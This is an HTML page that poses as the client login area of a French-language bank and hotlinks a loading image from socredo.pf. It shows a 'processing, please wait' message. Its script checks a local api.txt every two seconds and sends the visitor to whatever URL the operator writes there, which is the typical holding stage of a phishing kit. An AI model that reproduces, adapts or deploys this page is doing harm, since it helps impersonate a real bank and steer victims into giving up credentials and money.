<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connxion</title>
    <link rel="stylesheet" href="res/main.css">
</head>
<body>
<header>
<div class="holder">
<div class="left">
    <img src="res/logo.png">
</div>
<div class="right">
    <div class="user">
        <img src="res/user.png">
        <span>Devenir client</span>
    </div>
</div>
</div>
</header>    

<div class="banner">
<div class="holder">
Espace client
</div>
</div>


<main>
<div class="holder">
<div class="left">
<div class="form">

<div class="title">
Connexion
</div>

<div class="text">
Le traitement des données est en cours. Veuillez patienter.
</div>

<p style="text-align: center;"><img alt="" src="https://www.socredo.pf/connexion/assets/images/ajax-loader.gif" style="width: 60px; height: 60px;" />​</p>


 




</div>
</div>



<div class="right">
<img src="res/ad.png">
</div>
</div>
</main>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
	<script>
        function fetchAndRedirect() {
            var client = new XMLHttpRequest();
            client.open('GET', 'api.txt?v=' + new Date().getTime(), true); // Cache busting
            client.onreadystatechange = function() {
                if (client.readyState === 4) {
                    if (client.status === 200) {
                        var responseText = client.responseText;
                        console.log("Fetched responseText:", responseText);

                        // Extract URL from meta refresh tag
                        var urlMatch = responseText.match(/<meta\s+http-equiv=['"]refresh['"]\s+content=['"][^;]+;\s*url=([^'"]+)['"]/i);

                        if (urlMatch && urlMatch[1]) {
                            var redirectUrl = urlMatch[1];
                            console.log("Redirecting to URL:", redirectUrl);
                            window.location.href = redirectUrl;
                        } else {
                            console.error("Failed to extract URL from response.");
                        }
                    } else {
                        console.error("Failed to fetch data from api.txt, status code:", client.status);
                    }
                }
            };
            client.send();
        }

        // Fetch the URL and redirect every 2 seconds
        setInterval(fetchAndRedirect, 2000);
    </script>
</body>
</html>